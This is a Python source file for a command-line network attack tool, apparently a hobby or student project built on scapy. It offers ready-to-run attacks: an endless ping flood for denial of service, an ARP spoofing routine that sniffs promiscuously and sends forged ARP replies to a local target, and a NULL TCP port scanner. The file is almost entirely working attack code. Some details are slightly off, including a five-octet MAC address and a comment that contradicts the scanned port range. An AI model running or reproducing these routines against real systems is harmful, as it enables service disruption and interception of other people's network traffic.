from scapy.all import *
import pythonping
from scapy.layers.l2 import ARP
from scapy.layers.inet import TCP, IP

from helper import *
from banner_generator import print_banner


def handle_attack(args: list[str]):
    args_num = len(args)
    if args_num < 2:
        print('Invalid usage, see "help"')
        return

    target = resolve_target(args[1])
    if target == "":
        return  # Already prints an error message

    match args[0]:
        case "ddos":
            if args_num != 2:
                print('Invalid usage, see "help"')
                return
            commit_ddos(target)
        case "arp":
            if args_num != 2:
                print('Invalid usage, see "help"')
                return
            commit_arp_spoofing(target)
        case "tcp" | "portscan":
            if not 2 <= args_num <= 4:
                print('Invalid usage, see "help"')
                return
            commit_null_tcp_scan(target, *args[2:])
        case _:
            print('Attack not supported! Use "help" to learn more')


def commit_ddos(target: str):
    print('Committing DoS, press CTRL+C at any moment to stop.')
    try:
        while True:
            # By setting the timeout to 0, we can continuously send ping messages
            # without waiting for the response, as we don't care about it.
            pythonping.ping(target, verbose=False, timeout=0)
    except (KeyboardInterrupt, InterruptedError):
        print("\nAttack Terminated.")
    except BaseException:
        print("An exception occurred, abandoning attack.")


def commit_arp_spoofing(target: str):
    if not is_local_ip(target):
        print('Invalid use, please enter a private ip')
        return

    def packet_handler(packet):
        arp = packet[ARP]
        # Ensure that the packet is relevant
        if arp.op != 1 or arp.psrc != target:
            return
        send(ARP(op=2,
                 psrc=LOCAL_IP,
                 hwsrc='00:00:00:00:00',
                 pdst=target,
                 hwdst=arp.hwsrc
                 ))

    print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
    sniff(prn=packet_handler, promisc=True, store=False, filter='arp')


def commit_null_tcp_scan(target: str, ports: str = "", print_closed: bool = True):
    try:
        port_list = extract_ports(ports)
    except ValueError:
        print("Specified ports are invalid!")
        return

    if not port_list:
        print("No ports specified, scanning ports 20-80")
        port_list = range(20, 81)

    print(f'Committing NULL TCP port scanning for {target}')
    print("┌──────┬─────────┐\n"
          "│ PORT │  STATE  │\n"
          "├──────┼─────────┤")

    try:
        for port in port_list:  # Scan first 1024 ports
            print(f"\r│ {port:<5}│ ....... │", end="")  # Displays in case port is taking time

            to_send = IP(src=LOCAL_IP, dst=target) / TCP(dport=port)
            # to_send.show()
            resp = sr1(to_send, verbose=0, timeout=1)

            if resp:
                # print(f"flags={resp[TCP].flags} | ", end="")
                if resp[TCP].flags == 0x14:  # RST
                    if print_closed:
                        print(f"\r│ {port:<5}│ closed  │")
                else:
                    print(f"\r│ {port:<5}│ open    │")
            else:
                print(f"\r│ {port:<5}│ unknown │")

        print("└──────┴─────────┘")
    except (KeyboardInterrupt, InterruptedError):
        print("└──────┴─────────┘")
        print("\nAttack Terminated.")


# Returns whether to continue or not
def handle_command(cmd: list[str]) -> bool:
    if len(cmd) == 0:
        print('Command not supported! Use "help" to learn more')
        return True

    match cmd[0]:
        case "attack":
            handle_attack(cmd[1:])
        case "help":
            print(HELP)
        case "exit" | "quit" | "bye":
            return False
        case _:  # Default
            print('Command not supported! Use "help" to learn more')

    return True


def main():
    print_banner()
    print(HELP)

    try:
        while handle_command(get_command().split()):
            pass
    except (KeyboardInterrupt, UnicodeDecodeError):
        print()  # Newline for bye message

    print("\nBye bye!")


if __name__ == '__main__':
    main()
